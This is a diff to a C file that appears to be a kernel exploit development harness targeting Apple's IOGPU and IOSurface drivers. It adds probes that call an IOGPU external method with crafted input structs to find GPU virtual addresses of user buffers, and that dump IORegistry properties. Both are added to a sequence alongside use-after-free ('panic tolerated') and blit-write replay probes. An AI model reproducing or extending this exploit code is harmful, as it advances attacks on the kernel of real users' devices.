@@ -12749,6 +12749,75 @@ static void p_blitwrite(void) {
     LOG("[v70] done (alive)");
 }
 
+
+// V72: learn our resource GPUVA — create sel8 resource with wire flag
+// (in+0x16 bit0) and dump the full 0x58 out struct for GPUVA-looking fields.
+static void p_gpuva(void) {
+    LOG("[v72] resource GPUVA discovery");
+    io_connect_t c = open_service("IOGPU", 1);
+    if (!c) return;
+    uint8_t *buf = must_map(0x4000);
+    memset(buf, 0x41, 0x4000);
+    static const uint8_t f16[] = { 0, 1, 2, 3, 6, 7 };
+    for (unsigned v = 0; v < sizeof(f16); v++) {
+        uint8_t *in = must_map(0x1000);
+        uint8_t *out = must_map(0x1000);
+        memset(in, 0, 0x1000); memset(out, 0, 0x1000);
+        *(uint32_t *)(in + 0x00) = 0x80;
+        *(uint32_t *)(in + 0x30) = 1;
+        in[0x16] = f16[v];
+        *(uint64_t *)(in + 0x38) = (uint64_t)(uintptr_t)buf + 0x4000;
+        *(uint64_t *)(in + 0x40) = (uint64_t)(uintptr_t)buf;
+        *(uint64_t *)(in + 0x48) = 0x4000;
+        size_t osz = 0x58;
+        uint64_t osc[4] = {0,0,0,0}; uint32_t nosc = 0;
+        kern_return_t kr = IOConnectCallMethod(c, 8, NULL, 0, in, 0x68, osc, &nosc, out, &osz);
+        LOG("[gv] f16 %02x -> kr 0x%08x out:", f16[v], kr);
+        uint64_t *q = (uint64_t *)out;
+        for (int i = 0; i < 11; i += 4)
+            LOG("[gv]   +%02x: %016llx %016llx %016llx %016llx", i*8, q[i], q[i+1], q[i+2], q[i+3]);
+        vm_deallocate(mach_task_self(), (vm_address_t)in, 0x1000);
+        vm_deallocate(mach_task_self(), (vm_address_t)out, 0x1000);
+    }
+    LOG("[v72] done");
+}
+
+
+// V73: IORegistry dump of IOGPUResource objects (find GPUVA property)
+static void p_regdump(void) {
+    LOG("[v73] IORegistry IOGPUResource dump");
+    static const char *classes[] = { "IOGPUResource", "IOGPUSysMemory", "AGXDevice", "IOGPUDevice", NULL };
+    for (int ci = 0; classes[ci]; ci++) {
+        io_iterator_t it = 0;
+        kern_return_t kr = IOServiceGetMatchingServices(kIOMainPortDefault,
+                             IOServiceMatching(classes[ci]), &it);
+        if (kr || !it) { LOG("[rg] %s: none", classes[ci]); continue; }
+        int n = 0;
+        io_registry_entry_t e;
+        while ((e = IOIteratorNext(it)) && n < 3) {
+            CFMutableDictionaryRef props = NULL;
+            if (IORegistryEntryCreateCFProperties(e, &props, NULL, 0) == 0 && props) {
+                CFIndex cnt = CFDictionaryGetCount(props);
+                LOG("[rg] %s[%d]: %ld props", classes[ci], n, (long)cnt);
+                // dump keys
+                CFTypeRef *keys = malloc(cnt * sizeof(CFTypeRef));
+                CFDictionaryGetKeysAndValues(props, keys, NULL);
+                for (CFIndex k = 0; k < cnt && k < 20; k++) {
+                    CFStringRef ks = keys[k];
+                    char buf[96]; CFStringGetCString(ks, buf, 96, kCFStringEncodingUTF8);
+                    LOG("[rg]   key: %s", buf);
+                }
+                free(keys);
+                CFRelease(props);
+            }
+            IOObjectRelease(e);
+            n++;
+        }
+        IOObjectRelease(it);
+    }
+    LOG("[v73] done");
+}
+
 static void p4b_uaf2(void) {
     LOG("[v13-d] UAF destroy-first (panic tolerated)");
     IOSurfaceRef big1 = make_surface(2048, 2048);
@@ -12879,6 +12948,8 @@ void *t_iosurface_scaler(void *arg) {
     static int probed = 0;
     if (!probed) {
         probed = 1;
+        p_regdump();        // v73: IORegistry dump
+        p_gpuva();          // v72: resource GPUVA discovery
         p_blitwrite();      // v70: blit write replay
         p_agxfull();        // v68: full AGFI image
         p_agxfaithful();    // v67: faithful AGFI replay
